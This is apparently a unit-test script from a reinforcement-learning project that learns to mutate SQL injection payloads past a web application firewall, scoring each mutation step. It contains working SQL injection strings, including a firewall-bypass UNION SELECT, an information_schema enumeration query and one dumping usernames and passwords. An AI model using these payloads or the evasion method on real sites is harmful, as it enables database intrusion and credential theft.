"""
tools/test_readiness.py
=======================
Pure unit test (NO network) for env._waf_readiness after adding the 4
complex-tier triggers. Verifies:
  - trivial bypass scores max (8)
  - complex base scores low, and each correct mutation RAISES the score
    (so PBRS gives a gradient toward the complex bypass)
  - applying agg_swap / hex_to_char on a complex payload increases readiness

USAGE:
    python3 -m tools.test_readiness
"""
from seqsqli.rl.env import _waf_readiness
from seqsqli.core.mutations import MUTATIONS

agg = MUTATIONS["agg_swap"]
hexc = MUTATIONS["hex_to_char"]
case = MUTATIONS["case"]

CASES = [
    # label, payload
    ("trivial bypassed (expect 8)",
     "-1'%09uNIon%09sELEct%09database%a0(),'X','Y';%00"),
    ("trivial base (has space+kw+comment+db-adj)",
     "-1' UNION SELECT database(),'X','Y'-- -"),
    ("complex base raw (group_concat+hex+infoschema)",
     "-1' UNION SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) "
     "FROM information_schema.tables WHERE table_schema=database())-- -"),
    ("complex+from users raw",
     "-1' UNION SELECT (SELECT GROUP_CONCAT(username,0x3a,password) "
     "FROM users)-- -"),
]


def main():
    print("== _waf_readiness (0-8) ==")
    for label, p in CASES:
        print(f"  {_waf_readiness(p)}  | {label}")
    print()

    print("== gradient check: complex base, apply mutations step by step ==")
    p = ("-1' UNION SELECT (SELECT GROUP_CONCAT(table_schema,0x2e,table_name) "
         "FROM information_schema.tables WHERE table_schema=database())-- -")
    print(f"  start                : score={_waf_readiness(p)}")
    p2 = agg(p)
    print(f"  +agg_swap            : score={_waf_readiness(p2)}  (group_concat gone)")
    p3 = hexc(p2)
    print(f"  +hex_to_char         : score={_waf_readiness(p3)}  (0x.. gone)")
    p4 = case(p3)
    print(f"  +case                : score={_waf_readiness(p4)}  (info_schema/kw case-broken)")
    print()
    print("  Expect: score MONOTONICALLY non-decreasing -> PBRS gradient exists.")


if __name__ == "__main__":
    main()
